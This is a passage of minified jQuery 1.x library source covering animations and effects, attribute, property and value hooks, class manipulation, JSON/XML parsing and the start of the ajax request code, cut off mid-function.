    gb.prototype = {
        constructor: gb,
        init: function(a, b, c, d, e, f) {
            this.elem = a,
            this.prop = c,
            this.easing = e || n.easing._default,
            this.options = b,
            this.start = this.now = this.cur(),
            this.end = d,
            this.unit = f || (n.cssNumber[c] ? "" : "px")
        },
        cur: function() {
            var a = gb.propHooks[this.prop];
            return a && a.get ? a.get(this) : gb.propHooks._default.get(this)
        },
        run: function(a) {
            var b, c = gb.propHooks[this.prop];
            return this.options.duration ? this.pos = b = n.easing[this.easing](a, this.options.duration * a, 0, 1, this.options.duration) : this.pos = b = a,
            this.now = (this.end - this.start) * b + this.start,
            this.options.step && this.options.step.call(this.elem, this.now, this),
            c && c.set ? c.set(this) : gb.propHooks._default.set(this),
            this
        }
    },
    gb.prototype.init.prototype = gb.prototype,
    gb.propHooks = {
        _default: {
            get: function(a) {
                var b;
                return 1 !== a.elem.nodeType || null != a.elem[a.prop] && null == a.elem.style[a.prop] ? a.elem[a.prop] : (b = n.css(a.elem, a.prop, ""),
                b && "auto" !== b ? b : 0)
            },
            set: function(a) {
                n.fx.step[a.prop] ? n.fx.step[a.prop](a) : 1 !== a.elem.nodeType || null == a.elem.style[n.cssProps[a.prop]] && !n.cssHooks[a.prop] ? a.elem[a.prop] = a.now : n.style(a.elem, a.prop, a.now + a.unit)
            }
        }
    },
    gb.propHooks.scrollTop = gb.propHooks.scrollLeft = {
        set: function(a) {
            a.elem.nodeType && a.elem.parentNode && (a.elem[a.prop] = a.now)
        }
    },
    n.easing = {
        linear: function(a) {
            return a
        },
        swing: function(a) {
            return .5 - Math.cos(a * Math.PI) / 2
        },
        _default: "swing"
    },
    n.fx = gb.prototype.init,
    n.fx.step = {};
    var hb, ib, jb = /^(?:toggle|show|hide)$/, kb = /queueHooks$/;
    function lb() {
        return a.setTimeout(function() {
            hb = void 0
        }),
        hb = n.now()
    }
    function mb(a, b) {
        var c, d = {
            height: a
        }, e = 0;
        for (b = b ? 1 : 0; 4 > e; e += 2 - b)
            c = V[e],
            d["margin" + c] = d["padding" + c] = a;
        return b && (d.opacity = d.width = a),
        d
    }
    function nb(a, b, c) {
        for (var d, e = (qb.tweeners[b] || []).concat(qb.tweeners["*"]), f = 0, g = e.length; g > f; f++)
            if (d = e[f].call(c, b, a))
                return d
    }
    function ob(a, b, c) {
        var d, e, f, g, h, i, j, k, m = this, o = {}, p = a.style, q = a.nodeType && W(a), r = n._data(a, "fxshow");
        c.queue || (h = n._queueHooks(a, "fx"),
        null == h.unqueued && (h.unqueued = 0,
        i = h.empty.fire,
        h.empty.fire = function() {
            h.unqueued || i()
        }
        ),
        h.unqueued++,
        m.always(function() {
            m.always(function() {
                h.unqueued--,
                n.queue(a, "fx").length || h.empty.fire()
            })
        })),
        1 === a.nodeType && ("height"in b || "width"in b) && (c.overflow = [p.overflow, p.overflowX, p.overflowY],
        j = n.css(a, "display"),
        k = "none" === j ? n._data(a, "olddisplay") || Ma(a.nodeName) : j,
        "inline" === k && "none" === n.css(a, "float") && (l.inlineBlockNeedsLayout && "inline" !== Ma(a.nodeName) ? p.zoom = 1 : p.display = "inline-block")),
        c.overflow && (p.overflow = "hidden",
        l.shrinkWrapBlocks() || m.always(function() {
            p.overflow = c.overflow[0],
            p.overflowX = c.overflow[1],
            p.overflowY = c.overflow[2]
        }));
        for (d in b)
            if (e = b[d],
            jb.exec(e)) {
                if (delete b[d],
                f = f || "toggle" === e,
                e === (q ? "hide" : "show")) {
                    if ("show" !== e || !r || void 0 === r[d])
                        continue;
                    q = !0
                }
                o[d] = r && r[d] || n.style(a, d)
            } else
                j = void 0;
        if (n.isEmptyObject(o))
            "inline" === ("none" === j ? Ma(a.nodeName) : j) && (p.display = j);
        else {
            r ? "hidden"in r && (q = r.hidden) : r = n._data(a, "fxshow", {}),
            f && (r.hidden = !q),
            q ? n(a).show() : m.done(function() {
                n(a).hide()
            }),
            m.done(function() {
                var b;
                n._removeData(a, "fxshow");
                for (b in o)
                    n.style(a, b, o[b])
            });
            for (d in o)
                g = nb(q ? r[d] : 0, d, m),
                d in r || (r[d] = g.start,
                q && (g.end = g.start,
                g.start = "width" === d || "height" === d ? 1 : 0))
        }
    }
    function pb(a, b) {
        var c, d, e, f, g;
        for (c in a)
            if (d = n.camelCase(c),
            e = b[d],
            f = a[c],
            n.isArray(f) && (e = f[1],
            f = a[c] = f[0]),
            c !== d && (a[d] = f,
            delete a[c]),
            g = n.cssHooks[d],
            g && "expand"in g) {
                f = g.expand(f),
                delete a[d];
                for (c in f)
                    c in a || (a[c] = f[c],
                    b[c] = e)
            } else
                b[d] = e
    }
    function qb(a, b, c) {
        var d, e, f = 0, g = qb.prefilters.length, h = n.Deferred().always(function() {
            delete i.elem
        }), i = function() {
            if (e)
                return !1;
            for (var b = hb || lb(), c = Math.max(0, j.startTime + j.duration - b), d = c / j.duration || 0, f = 1 - d, g = 0, i = j.tweens.length; i > g; g++)
                j.tweens[g].run(f);
            return h.notifyWith(a, [j, f, c]),
            1 > f && i ? c : (h.resolveWith(a, [j]),
            !1)
        }, j = h.promise({
            elem: a,
            props: n.extend({}, b),
            opts: n.extend(!0, {
                specialEasing: {},
                easing: n.easing._default
            }, c),
            originalProperties: b,
            originalOptions: c,
            startTime: hb || lb(),
            duration: c.duration,
            tweens: [],
            createTween: function(b, c) {
                var d = n.Tween(a, j.opts, b, c, j.opts.specialEasing[b] || j.opts.easing);
                return j.tweens.push(d),
                d
            },
            stop: function(b) {
                var c = 0
                  , d = b ? j.tweens.length : 0;
                if (e)
                    return this;
                for (e = !0; d > c; c++)
                    j.tweens[c].run(1);
                return b ? (h.notifyWith(a, [j, 1, 0]),
                h.resolveWith(a, [j, b])) : h.rejectWith(a, [j, b]),
                this
            }
        }), k = j.props;
        for (pb(k, j.opts.specialEasing); g > f; f++)
            if (d = qb.prefilters[f].call(j, a, k, j.opts))
                return n.isFunction(d.stop) && (n._queueHooks(j.elem, j.opts.queue).stop = n.proxy(d.stop, d)),
                d;
        return n.map(k, nb, j),
        n.isFunction(j.opts.start) && j.opts.start.call(a, j),
        n.fx.timer(n.extend(i, {
            elem: a,
            anim: j,
            queue: j.opts.queue
        })),
        j.progress(j.opts.progress).done(j.opts.done, j.opts.complete).fail(j.opts.fail).always(j.opts.always)
    }
    n.Animation = n.extend(qb, {
        tweeners: {
            "*": [function(a, b) {
                var c = this.createTween(a, b);
                return X(c.elem, a, U.exec(b), c),
                c
            }
            ]
        },
        tweener: function(a, b) {
            n.isFunction(a) ? (b = a,
            a = ["*"]) : a = a.match(G);
            for (var c, d = 0, e = a.length; e > d; d++)
                c = a[d],
                qb.tweeners[c] = qb.tweeners[c] || [],
                qb.tweeners[c].unshift(b)
        },
        prefilters: [ob],
        prefilter: function(a, b) {
            b ? qb.prefilters.unshift(a) : qb.prefilters.push(a)
        }
    }),
    n.speed = function(a, b, c) {
        var d = a && "object" == typeof a ? n.extend({}, a) : {
            complete: c || !c && b || n.isFunction(a) && a,
            duration: a,
            easing: c && b || b && !n.isFunction(b) && b
        };
        return d.duration = n.fx.off ? 0 : "number" == typeof d.duration ? d.duration : d.duration in n.fx.speeds ? n.fx.speeds[d.duration] : n.fx.speeds._default,
        null != d.queue && d.queue !== !0 || (d.queue = "fx"),
        d.old = d.complete,
        d.complete = function() {
            n.isFunction(d.old) && d.old.call(this),
            d.queue && n.dequeue(this, d.queue)
        }
        ,
        d
    }
    ,
    n.fn.extend({
        fadeTo: function(a, b, c, d) {
            return this.filter(W).css("opacity", 0).show().end().animate({
                opacity: b
            }, a, c, d)
        },
        animate: function(a, b, c, d) {
            var e = n.isEmptyObject(a)
              , f = n.speed(b, c, d)
              , g = function() {
                var b = qb(this, n.extend({}, a), f);
                (e || n._data(this, "finish")) && b.stop(!0)
            };
            return g.finish = g,
            e || f.queue === !1 ? this.each(g) : this.queue(f.queue, g)
        },
        stop: function(a, b, c) {
            var d = function(a) {
                var b = a.stop;
                delete a.stop,
                b(c)
            };
            return "string" != typeof a && (c = b,
            b = a,
            a = void 0),
            b && a !== !1 && this.queue(a || "fx", []),
            this.each(function() {
                var b = !0
                  , e = null != a && a + "queueHooks"
                  , f = n.timers
                  , g = n._data(this);
                if (e)
                    g[e] && g[e].stop && d(g[e]);
                else
                    for (e in g)
                        g[e] && g[e].stop && kb.test(e) && d(g[e]);
                for (e = f.length; e--; )
                    f[e].elem !== this || null != a && f[e].queue !== a || (f[e].anim.stop(c),
                    b = !1,
                    f.splice(e, 1));
                !b && c || n.dequeue(this, a)
            })
        },
        finish: function(a) {
            return a !== !1 && (a = a || "fx"),
            this.each(function() {
                var b, c = n._data(this), d = c[a + "queue"], e = c[a + "queueHooks"], f = n.timers, g = d ? d.length : 0;
                for (c.finish = !0,
                n.queue(this, a, []),
                e && e.stop && e.stop.call(this, !0),
                b = f.length; b--; )
                    f[b].elem === this && f[b].queue === a && (f[b].anim.stop(!0),
                    f.splice(b, 1));
                for (b = 0; g > b; b++)
                    d[b] && d[b].finish && d[b].finish.call(this);
                delete c.finish
            })
        }
    }),
    n.each(["toggle", "show", "hide"], function(a, b) {
        var c = n.fn[b];
        n.fn[b] = function(a, d, e) {
            return null == a || "boolean" == typeof a ? c.apply(this, arguments) : this.animate(mb(b, !0), a, d, e)
        }
    }),
    n.each({
        slideDown: mb("show"),
        slideUp: mb("hide"),
        slideToggle: mb("toggle"),
        fadeIn: {
            opacity: "show"
        },
        fadeOut: {
            opacity: "hide"
        },
        fadeToggle: {
            opacity: "toggle"
        }
    }, function(a, b) {
        n.fn[a] = function(a, c, d) {
            return this.animate(b, a, c, d)
        }
    }),
    n.timers = [],
    n.fx.tick = function() {
        var a, b = n.timers, c = 0;
        for (hb = n.now(); c < b.length; c++)
            a = b[c],
            a() || b[c] !== a || b.splice(c--, 1);
        b.length || n.fx.stop(),
        hb = void 0
    }
    ,
    n.fx.timer = function(a) {
        n.timers.push(a),
        a() ? n.fx.start() : n.timers.pop()
    }
    ,
    n.fx.interval = 13,
    n.fx.start = function() {
        ib || (ib = a.setInterval(n.fx.tick, n.fx.interval))
    }
    ,
    n.fx.stop = function() {
        a.clearInterval(ib),
        ib = null
    }
    ,
    n.fx.speeds = {
        slow: 600,
        fast: 200,
        _default: 400
    },
    n.fn.delay = function(b, c) {
        return b = n.fx ? n.fx.speeds[b] || b : b,
        c = c || "fx",
        this.queue(c, function(c, d) {
            var e = a.setTimeout(c, b);
            d.stop = function() {
                a.clearTimeout(e)
            }
        })
    }
    ,
    function() {
        var a, b = d.createElement("input"), c = d.createElement("div"), e = d.createElement("select"), f = e.appendChild(d.createElement("option"));
        c = d.createElement("div"),
        c.setAttribute("className", "t"),
        c.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
        a = c.getElementsByTagName("a")[0],
        b.setAttribute("type", "checkbox"),
        c.appendChild(b),
        a = c.getElementsByTagName("a")[0],
        a.style.cssText = "top:1px",
        l.getSetAttribute = "t" !== c.className,
        l.style = /top/.test(a.getAttribute("style")),
        l.hrefNormalized = "/a" === a.getAttribute("href"),
        l.checkOn = !!b.value,
        l.optSelected = f.selected,
        l.enctype = !!d.createElement("form").enctype,
        e.disabled = !0,
        l.optDisabled = !f.disabled,
        b = d.createElement("input"),
        b.setAttribute("value", ""),
        l.input = "" === b.getAttribute("value"),
        b.value = "t",
        b.setAttribute("type", "radio"),
        l.radioValue = "t" === b.value
    }();
    var rb = /\r/g
      , sb = /[\x20\t\r\n\f]+/g;
    n.fn.extend({
        val: function(a) {
            var b, c, d, e = this[0];
            {
                if (arguments.length)
                    return d = n.isFunction(a),
                    this.each(function(c) {
                        var e;
                        1 === this.nodeType && (e = d ? a.call(this, c, n(this).val()) : a,
                        null == e ? e = "" : "number" == typeof e ? e += "" : n.isArray(e) && (e = n.map(e, function(a) {
                            return null == a ? "" : a + ""
                        })),
                        b = n.valHooks[this.type] || n.valHooks[this.nodeName.toLowerCase()],
                        b && "set"in b && void 0 !== b.set(this, e, "value") || (this.value = e))
                    });
                if (e)
                    return b = n.valHooks[e.type] || n.valHooks[e.nodeName.toLowerCase()],
                    b && "get"in b && void 0 !== (c = b.get(e, "value")) ? c : (c = e.value,
                    "string" == typeof c ? c.replace(rb, "") : null == c ? "" : c)
            }
        }
    }),
    n.extend({
        valHooks: {
            option: {
                get: function(a) {
                    var b = n.find.attr(a, "value");
                    return null != b ? b : n.trim(n.text(a)).replace(sb, " ")
                }
            },
            select: {
                get: function(a) {
                    for (var b, c, d = a.options, e = a.selectedIndex, f = "select-one" === a.type || 0 > e, g = f ? null : [], h = f ? e + 1 : d.length, i = 0 > e ? h : f ? e : 0; h > i; i++)
                        if (c = d[i],
                        (c.selected || i === e) && (l.optDisabled ? !c.disabled : null === c.getAttribute("disabled")) && (!c.parentNode.disabled || !n.nodeName(c.parentNode, "optgroup"))) {
                            if (b = n(c).val(),
                            f)
                                return b;
                            g.push(b)
                        }
                    return g
                },
                set: function(a, b) {
                    var c, d, e = a.options, f = n.makeArray(b), g = e.length;
                    while (g--)
                        if (d = e[g],
                        n.inArray(n.valHooks.option.get(d), f) > -1)
                            try {
                                d.selected = c = !0
                            } catch (h) {
                                d.scrollHeight
                            }
                        else
                            d.selected = !1;
                    return c || (a.selectedIndex = -1),
                    e
                }
            }
        }
    }),
    n.each(["radio", "checkbox"], function() {
        n.valHooks[this] = {
            set: function(a, b) {
                return n.isArray(b) ? a.checked = n.inArray(n(a).val(), b) > -1 : void 0
            }
        },
        l.checkOn || (n.valHooks[this].get = function(a) {
            return null === a.getAttribute("value") ? "on" : a.value
        }
        )
    });
    var tb, ub, vb = n.expr.attrHandle, wb = /^(?:checked|selected)$/i, xb = l.getSetAttribute, yb = l.input;
    n.fn.extend({
        attr: function(a, b) {
            return Y(this, n.attr, a, b, arguments.length > 1)
        },
        removeAttr: function(a) {
            return this.each(function() {
                n.removeAttr(this, a)
            })
        }
    }),
    n.extend({
        attr: function(a, b, c) {
            var d, e, f = a.nodeType;
            if (3 !== f && 8 !== f && 2 !== f)
                return "undefined" == typeof a.getAttribute ? n.prop(a, b, c) : (1 === f && n.isXMLDoc(a) || (b = b.toLowerCase(),
                e = n.attrHooks[b] || (n.expr.match.bool.test(b) ? ub : tb)),
                void 0 !== c ? null === c ? void n.removeAttr(a, b) : e && "set"in e && void 0 !== (d = e.set(a, c, b)) ? d : (a.setAttribute(b, c + ""),
                c) : e && "get"in e && null !== (d = e.get(a, b)) ? d : (d = n.find.attr(a, b),
                null == d ? void 0 : d))
        },
        attrHooks: {
            type: {
                set: function(a, b) {
                    if (!l.radioValue && "radio" === b && n.nodeName(a, "input")) {
                        var c = a.value;
                        return a.setAttribute("type", b),
                        c && (a.value = c),
                        b
                    }
                }
            }
        },
        removeAttr: function(a, b) {
            var c, d, e = 0, f = b && b.match(G);
            if (f && 1 === a.nodeType)
                while (c = f[e++])
                    d = n.propFix[c] || c,
                    n.expr.match.bool.test(c) ? yb && xb || !wb.test(c) ? a[d] = !1 : a[n.camelCase("default-" + c)] = a[d] = !1 : n.attr(a, c, ""),
                    a.removeAttribute(xb ? c : d)
        }
    }),
    ub = {
        set: function(a, b, c) {
            return b === !1 ? n.removeAttr(a, c) : yb && xb || !wb.test(c) ? a.setAttribute(!xb && n.propFix[c] || c, c) : a[n.camelCase("default-" + c)] = a[c] = !0,
            c
        }
    },
    n.each(n.expr.match.bool.source.match(/\w+/g), function(a, b) {
        var c = vb[b] || n.find.attr;
        yb && xb || !wb.test(b) ? vb[b] = function(a, b, d) {
            var e, f;
            return d || (f = vb[b],
            vb[b] = e,
            e = null != c(a, b, d) ? b.toLowerCase() : null,
            vb[b] = f),
            e
        }
        : vb[b] = function(a, b, c) {
            return c ? void 0 : a[n.camelCase("default-" + b)] ? b.toLowerCase() : null
        }
    }),
    yb && xb || (n.attrHooks.value = {
        set: function(a, b, c) {
            return n.nodeName(a, "input") ? void (a.defaultValue = b) : tb && tb.set(a, b, c)
        }
    }),
    xb || (tb = {
        set: function(a, b, c) {
            var d = a.getAttributeNode(c);
            return d || a.setAttributeNode(d = a.ownerDocument.createAttribute(c)),
            d.value = b += "",
            "value" === c || b === a.getAttribute(c) ? b : void 0
        }
    },
    vb.id = vb.name = vb.coords = function(a, b, c) {
        var d;
        return c ? void 0 : (d = a.getAttributeNode(b)) && "" !== d.value ? d.value : null
    }
    ,
    n.valHooks.button = {
        get: function(a, b) {
            var c = a.getAttributeNode(b);
            return c && c.specified ? c.value : void 0
        },
        set: tb.set
    },
    n.attrHooks.contenteditable = {
        set: function(a, b, c) {
            tb.set(a, "" === b ? !1 : b, c)
        }
    },
    n.each(["width", "height"], function(a, b) {
        n.attrHooks[b] = {
            set: function(a, c) {
                return "" === c ? (a.setAttribute(b, "auto"),
                c) : void 0
            }
        }
    })),
    l.style || (n.attrHooks.style = {
        get: function(a) {
            return a.style.cssText || void 0
        },
        set: function(a, b) {
            return a.style.cssText = b + ""
        }
    });
    var zb = /^(?:input|select|textarea|button|object)$/i
      , Ab = /^(?:a|area)$/i;
    n.fn.extend({
        prop: function(a, b) {
            return Y(this, n.prop, a, b, arguments.length > 1)
        },
        removeProp: function(a) {
            return a = n.propFix[a] || a,
            this.each(function() {
                try {
                    this[a] = void 0,
                    delete this[a]
                } catch (b) {}
            })
        }
    }),
    n.extend({
        prop: function(a, b, c) {
            var d, e, f = a.nodeType;
            if (3 !== f && 8 !== f && 2 !== f)
                return 1 === f && n.isXMLDoc(a) || (b = n.propFix[b] || b,
                e = n.propHooks[b]),
                void 0 !== c ? e && "set"in e && void 0 !== (d = e.set(a, c, b)) ? d : a[b] = c : e && "get"in e && null !== (d = e.get(a, b)) ? d : a[b]
        },
        propHooks: {
            tabIndex: {
                get: function(a) {
                    var b = n.find.attr(a, "tabindex");
                    return b ? parseInt(b, 10) : zb.test(a.nodeName) || Ab.test(a.nodeName) && a.href ? 0 : -1
                }
            }
        },
        propFix: {
            "for": "htmlFor",
            "class": "className"
        }
    }),
    l.hrefNormalized || n.each(["href", "src"], function(a, b) {
        n.propHooks[b] = {
            get: function(a) {
                return a.getAttribute(b, 4)
            }
        }
    }),
    l.optSelected || (n.propHooks.selected = {
        get: function(a) {
            var b = a.parentNode;
            return b && (b.selectedIndex,
            b.parentNode && b.parentNode.selectedIndex),
            null
        },
        set: function(a) {
            var b = a.parentNode;
            b && (b.selectedIndex,
            b.parentNode && b.parentNode.selectedIndex)
        }
    }),
    n.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
        n.propFix[this.toLowerCase()] = this
    }),
    l.enctype || (n.propFix.enctype = "encoding");
    var Bb = /[\t\r\n\f]/g;
    function Cb(a) {
        return n.attr(a, "class") || ""
    }
    n.fn.extend({
        addClass: function(a) {
            var b, c, d, e, f, g, h, i = 0;
            if (n.isFunction(a))
                return this.each(function(b) {
                    n(this).addClass(a.call(this, b, Cb(this)))
                });
            if ("string" == typeof a && a) {
                b = a.match(G) || [];
                while (c = this[i++])
                    if (e = Cb(c),
                    d = 1 === c.nodeType && (" " + e + " ").replace(Bb, " ")) {
                        g = 0;
                        while (f = b[g++])
                            d.indexOf(" " + f + " ") < 0 && (d += f + " ");
                        h = n.trim(d),
                        e !== h && n.attr(c, "class", h)
                    }
            }
            return this
        },
        removeClass: function(a) {
            var b, c, d, e, f, g, h, i = 0;
            if (n.isFunction(a))
                return this.each(function(b) {
                    n(this).removeClass(a.call(this, b, Cb(this)))
                });
            if (!arguments.length)
                return this.attr("class", "");
            if ("string" == typeof a && a) {
                b = a.match(G) || [];
                while (c = this[i++])
                    if (e = Cb(c),
                    d = 1 === c.nodeType && (" " + e + " ").replace(Bb, " ")) {
                        g = 0;
                        while (f = b[g++])
                            while (d.indexOf(" " + f + " ") > -1)
                                d = d.replace(" " + f + " ", " ");
                        h = n.trim(d),
                        e !== h && n.attr(c, "class", h)
                    }
            }
            return this
        },
        toggleClass: function(a, b) {
            var c = typeof a;
            return "boolean" == typeof b && "string" === c ? b ? this.addClass(a) : this.removeClass(a) : n.isFunction(a) ? this.each(function(c) {
                n(this).toggleClass(a.call(this, c, Cb(this), b), b)
            }) : this.each(function() {
                var b, d, e, f;
                if ("string" === c) {
                    d = 0,
                    e = n(this),
                    f = a.match(G) || [];
                    while (b = f[d++])
                        e.hasClass(b) ? e.removeClass(b) : e.addClass(b)
                } else
                    void 0 !== a && "boolean" !== c || (b = Cb(this),
                    b && n._data(this, "__className__", b),
                    n.attr(this, "class", b || a === !1 ? "" : n._data(this, "__className__") || ""))
            })
        },
        hasClass: function(a) {
            var b, c, d = 0;
            b = " " + a + " ";
            while (c = this[d++])
                if (1 === c.nodeType && (" " + Cb(c) + " ").replace(Bb, " ").indexOf(b) > -1)
                    return !0;
            return !1
        }
    }),
    n.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(a, b) {
        n.fn[b] = function(a, c) {
            return arguments.length > 0 ? this.on(b, null, a, c) : this.trigger(b)
        }
    }),
    n.fn.extend({
        hover: function(a, b) {
            return this.mouseenter(a).mouseleave(b || a)
        }
    });
    var Db = a.location
      , Eb = n.now()
      , Fb = /\?/
      , Gb = /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
    n.parseJSON = function(b) {
        if (a.JSON && a.JSON.parse)
            return a.JSON.parse(b + "");
        var c, d = null, e = n.trim(b + "");
        return e && !n.trim(e.replace(Gb, function(a, b, e, f) {
            return c && b && (d = 0),
            0 === d ? a : (c = e || b,
            d += !f - !e,
            "")
        })) ? Function("return " + e)() : n.error("Invalid JSON: " + b)
    }
    ,
    n.parseXML = function(b) {
        var c, d;
        if (!b || "string" != typeof b)
            return null;
        try {
            a.DOMParser ? (d = new a.DOMParser,
            c = d.parseFromString(b, "text/xml")) : (c = new a.ActiveXObject("Microsoft.XMLDOM"),
            c.async = "false",
            c.loadXML(b))
        } catch (e) {
            c = void 0
        }
        return c && c.documentElement && !c.getElementsByTagName("parsererror").length || n.error("Invalid XML: " + b),
        c
    }
    ;
    var Hb = /#.*$/
      , Ib = /([?&])_=[^&]*/
      , Jb = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm
      , Kb = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/
      , Lb = /^(?:GET|HEAD)$/
      , Mb = /^\/\//
      , Nb = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/
      , Ob = {}
      , Pb = {}
      , Qb = "*/".concat("*")
      , Rb = Db.href
      , Sb = Nb.exec(Rb.toLowerCase()) || [];
    function Tb(a) {
        return function(b, c) {
            "string" != typeof b && (c = b,
            b = "*");
            var d, e = 0, f = b.toLowerCase().match(G) || [];
            if (n.isFunction(c))
                while (d = f[e++])
                    "+" === d.charAt(0) ? (d = d.slice(1) || "*",
                    (a[d] = a[d] || []).unshift(c)) : (a[d] = a[d] || []).push(c)
        }
    }
    function Ub(a, b, c, d) {
        var e = {}
          , f = a === Pb;
        function g(h) {
            var i;
            return e[h] = !0,
            n.each(a[h] || [], function(a, h) {
                var j = h(b, c, d);
                return "string" != typeof j || f || e[j] ? f ? !(i = j) : void 0 : (b.dataTypes.unshift(j),
                g(j),
                !1)
            }),
            i
        }
        return g(b.dataTypes[0]) || !e["*"] && g("*")
    }
    function Vb(a, b) {
        var c, d, e = n.ajaxSettings.flatOptions || {};
        for (d in b)
            void 0 !== b[d] && ((e[d] ? a : c || (c = {}))[d] = b[d]);
        return c && n.extend(!0, a, c),
        a
    }
    function Wb(a, b, c) {
        var d, e, f, g, h = a.contents, i = a.dataTypes;
        while ("*" === i[0])
            i.shift(),
            void 0 === e && (e = a.mimeType || b.getResponseHeader("Content-Type"));
        if (e)
            for (g in h)
                if (h[g] && h[g].test(e)) {
                    i.unshift(g);
                    break
                }
        if (i[0]in c)
            f = i[0];
        else {
            for (g in c) {
                if (!i[0] || a.converters[g + " " + i[0]]) {
                    f = g;
                    break
                }
                d || (d = g)
            }
            f = f || d
        }
        return f ? (f !== i[0] && i.unshift(f),
        c[f]) : void 0
    }
    function Xb(a, b, c, d) {
        var e, f, g, h, i, j = {}, k = a.dataTypes.slice();
        if (k[1])
            for (g in a.converters)
                j[g.toLowerCase()] = a.converters[g];
        f = k.shift();
        while (f)
            if (a.responseFields[f] && (c[a.responseFields[f]] = b),
            !i && d && a.dataFilter && (b = a.dataFilter(b, a.dataType)),
            i = f,
            f = k.shift())
                if ("*" === f)
                    f = i;
                else if ("*" !== i && i !== f) {
                    if (g = j[i + " " + f] || j["* " + f],
                    !g)
                        for (e in j)
                            if (h = e.split(" "),
                            h[1] === f && (g = j[i + " " + h[0]] || j["* " + h[0]])) {
                                g === !0 ? g = j[e] : j[e] !== !0 && (f = h[0],
                                k.unshift(h[1]));
                                break
                            }
                    if (g !== !0)
                        if (g && a["throws"])
                            b = g(b);
                        else
                            try {
                                b = g(b)
                            } catch (l) {
                                return {
                                    state: "parsererror",
                                    error: g ? l : "No conversion from " + i + " to " + f
                                }
                            }
                }
        return {
            state: "success",
            data: b
        }
    }
    n.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: Rb,
            type: "GET",
            isLocal: Kb.test(Sb[1]),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": Qb,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /\bxml\b/,
                html: /\bhtml/,
                json: /\bjson\b/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": n.parseJSON,
                "text xml": n.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(a, b) {
            return b ? Vb(Vb(a, n.ajaxSettings), b) : Vb(n.ajaxSettings, a)
        },
        ajaxPrefilter: Tb(Ob),
        ajaxTransport: Tb(Pb),
        ajax: function(b, c) {
            "object" == typeof b && (c = b,
            b = void 0),
            c = c || {};
            var d, e, f, g, h, i, j, k, l = n.ajaxSetup({}, c), m = l.context || l, o = l.context && (m.nodeType || m.jquery) ? n(m) : n.event, p = n.Deferred(), q = n.Callbacks("once memory"), r = l.statusCode || {}, s = {}, t = {}, u = 0, v = "canceled", w = {
                readyState: 0,
                getResponseHeader: function(a) {
                    var b;
                    if (2 === u) {
                        if (!k) {
                            k = {};
                            while (b = Jb.exec(g))
                                k[b[1].toLowerCase()] = b[2]
                        }
                        b = k[a.toLowerCase()]
                    }
                    return null == b ? null : b
                },
                getAllResponseHeaders: function() {
                    return 2 === u ? g : null
                },
                setRequestHeader: function(a, b) {
                    var c = a.toLowerCase();
                    return u || (a = t[c] = t[c] || a,
                    s[a] = b),
                    this
                },
                overrideMimeType: function(a) {
                    return u || (l.mimeType = a),
                    this
                },
                statusCode: function(a) {
                    var b;
                    if (a)
                        if (2 > u)
                            for (b in a)
                                r[b] = [r[b], a[b]];
                        else
                            w.always(a[w.status]);
                    return this
                },
                abort: function(a) {
                    var b = a || v;
                    return j && j.abort(b),
                    y(0, b),
                    this
                }
            };
            if (p.promise(w).complete = q.add,
            w.success = w.done,
            w.error = w.fail,
            l.url = ((b || l.url || Rb) + "").replace(Hb, "").replace(Mb, Sb[1] + "//"),
            l.type = c.method || c.type || l.method || l.type,
            l.dataTypes = n.trim(l.dataType || "*").toLowerCase().match(G) || [""],
            null == l.crossDomain && (d = Nb.exec(l.url.toLowerCase()),
            l.crossDomain = !(!d || d[1] === Sb[1] && d[2] === Sb[2] && (d[3] || ("http:" === d[1] ? "80" : "443")) === (Sb[3] || ("http:" === Sb[1] ? "80" : "443")))),
            l.data && l.processData && "string" != typeof l.data && (l.data = n.param(l.data, l.traditional)),
            Ub(Ob, l, c, w),
            2 === u)
                return w;
            i = n.event && l.global,
            i && 0 === n.active++ && n.event.trigger("ajaxStart"),
            l.type = l.type.toUpperCase(),
            l.hasContent = !Lb.test(l.type),
            f = l.url,
            l.hasContent || (l.data && (f = l.url += (Fb.test(f) ? "&" : "?") + l.data,
            delete l.data),
            l.cache === !1 && (l.url = Ib.test(f) ? f.replace(Ib, "$1_=" + Eb++) : f + (Fb.test(f) ? "&" : "?") + "_=" + Eb++)),
            l.ifModified && (n.lastModified[f] && w.setRequestHeader("If-Modified-Since", n.lastModified[f]),
            n.etag[f] && w.setRequestHeader("If-None-Match", n.etag[f])),
            (l.data && l.hasContent && l.contentType !== !1 || c.contentType) && w.setRequestHeader("Content-Type", l.contentType),
            w.setRequestHeader("Accept", l.dataTypes[0] && l.accepts[l.dataTypes[0]] ? l.accepts[l.dataTypes[0]] + ("*" !== l.dataTypes[0] ? ", " + Qb + "; q=0.01" : "") : l.accepts["*"]);
            for (e in l.headers)
                w.setRequestHeader(e, l.headers[e]);
            if (l.beforeSend && (l.beforeSend.call(m, w, l) === !1 || 2 === u))
                return w.abort();
            v = "abort";
            for (e in {
                success: 1,
                error: 1,
                complete: 1
            })
                w[e](l[e]);
            if (j = Ub(Pb, l, c, w)) {
                if (w.readyState = 1,
                i && o.trigger("ajaxSend", [w, l]),
                2 === u)
                    return w;
                l.async && l.timeout > 0 && (h = a.setTimeout(function() {
                    w.abort("timeout")
                }, l.timeout));
                try {
                    u = 1,
                    j.send(s, y)
                } catch (x) {
                    if (!(2 > u))
                        throw x;
                    y(-1, x)
                }
            } else
